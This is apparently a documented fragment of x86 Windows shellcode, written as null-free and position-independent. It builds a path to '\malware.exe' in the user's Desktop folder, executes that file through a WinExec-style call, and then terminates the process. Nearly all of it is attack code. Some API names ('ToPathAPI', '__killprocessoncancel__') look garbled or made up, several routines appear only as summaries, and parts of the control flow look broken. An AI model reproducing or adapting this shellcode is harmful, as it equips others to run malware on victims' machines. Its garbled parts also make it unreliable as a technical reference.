 ##  This following code has been developed in the Assembly Programming Language. It is thoroughly documented and licensed under the ownership of  ##########################. The implementation is Null-Free Position-Independent Shellcode thereby guaranteeing optimal performance across varying execution environments.




"load path var": Initialize ESI and EDI registers to append the "\malware.exe" file name to the path returned by the ToPathAPI: # pwd.

"load_path_var:"
    " xor eax, eax ;"
    " mov edi, esp ;"
    " add edi, 0xfffffefc ;" #
    " mov edx, edi ;" # Keep string pointer in EDX

    " mov esi, [ebp+0x28] ;" # Path / Str 1





"load path": Load a byte from ESI to AL. Check if it is a null terminator. If not, it stores the byte. Once the path is copied, ESI is reinitialized to load the executable name and generate its absolute path.


"load_path:"
    " lodsb ;"
    " test al, al ;" ## ? Is 0x0
    " jnz store_path ;" # If not, store the byte. Additional validation. Renamed for clarity.
    " xor esi, esi ;"
    " push ecx ;" # Append "\malware.exe" to the path.
    " pop esi  ;" ##   
    " jmp copy_filename;"




"store path": Stores the byte from AL in EDI if it is not NULL.


"store_path:"
    " stosb ;" # store the byte in EDI
    " jnz load_path ;"



"copy filename": Generates the absolute path. It appends the two strings (path and file name).



"copy_filename:"
    " lodsb ;"
    " stosb ;"
    " test al, al ;"
    " jnz copy_filename ;"
    " ret ;"




"retrieve fp": calls the ToPathAPI again to reconstruct the absolute path to the executable and subsequently feeds it to the API.


"retrieve_fp:" # Retrieve current user Desktop path again for further processing
    " mov edi, esp ;"
    " add edi, 0xfffffefc ;" #
    " mov  [ebp+0x28], edi ;"  #  Save address for later usage of the Current User Path
    
    " push esp ;"
    " pop esi ;"
    " push edi ;"

    " xor eax, eax ;" # Null EAX
    " push eax ;"   # push dwFlags (SHGFP_TYPE_CURRENT)

    " push eax ;"  # push Token

    " sub eax, 0xfffffff0 ;"
    " push eax ;"  # push csidl (integer)

    " xor eax, eax ;" # Null EAX 
    " push eax ;"  # push hwnd




## Second call to ToPathAPI

    " call dword ptr [ebp+0x20] ;"
    " push esp ;"
    " pop ebx ;" ## Store EXE name






"reload path var": Same as "load_path_var".

"reload path": Same as "load_path".

"restore path": Same as "store_path".




[ * ]  The above three function calls are positioned so that they are referenced with a negative offset and do not generate NULL bytes.

"exe_path": Same as "copy filename". Return the absolute path to the executable to use in the API call. Renamed for clarity.


"call API": Executes the Payload.

"call API:" #
    " xor eax, eax ;" # NULL EAX
    " inc eax ;"
    " push eax ;" # nCmdShow
    " push edx ;" # lpCdLine

    " call dword ptr [ebp+0x1c] ;" ## 


" terminate: " #
    " xor ecx, ecx ;" # Null ECX
    " push ecx ;" # uExitCode
    " push 0xffffffff ;" # hProcess
    " call dword ptr [ebp+0x10] ;"  ##  Call "__killprocessoncancel__". Calls "killprocessoncancel".   

